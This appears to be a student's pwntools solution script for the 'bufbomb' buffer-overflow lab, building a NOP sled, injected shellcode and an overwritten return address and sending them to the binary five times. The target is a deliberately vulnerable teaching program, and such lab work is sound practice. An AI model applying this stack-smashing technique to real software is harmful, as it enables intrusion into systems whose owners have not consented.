from pwn import *

c = process(["./bufbomb", '-u', '1180300105', '-n'])

# gdb.attach(c)

code  = 'mov    %eax, 0x369393d1\n'
code += 'mov    %ebp, %esp\n'
code += 'add    %ebp, 24\n'
code += 'push   0x08048d21\n'
code += 'ret'

code = asm(code)
code = (0x208+4-len(code))*asm('nop') + code + p32(0x55683bb0 - 0x50 - len(code))

for _ in range(5):
    c.sendline(code)

c.interactive()

print(code.encode('hex'))